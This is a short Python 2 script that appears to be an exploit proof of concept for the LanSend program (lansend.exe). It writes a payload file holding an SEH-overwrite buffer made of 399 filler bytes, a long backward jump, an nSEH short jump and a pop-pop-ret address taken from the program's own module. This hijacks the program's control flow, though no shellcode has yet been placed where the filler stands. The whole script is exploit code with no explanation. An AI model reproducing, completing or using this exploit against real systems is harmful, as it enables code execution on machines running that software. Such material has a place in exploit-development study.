#!/usr/bin/python

f = file('payload.txt','w')

nSeh = "\xEB\xF9\x90\x90" # short jump back 5 bytes
Seh  = "\x4c\x7b\x41"     # 0x00417b4c : pop ecx # pop ebp # ret 0x04 - C:\Users\Exp\AppData\Local\Programs\LizardSystems\LanSend\lansend.exe

longJump="\xE9\x6D\xFE\xFF\xFF" # jumps to the start of the A buffer

payload  = "A" * 399
payload += longJump
payload += nSeh
payload += Seh
#payload += "D" * (2000 - len(payload))

f.write(payload)
f.close()

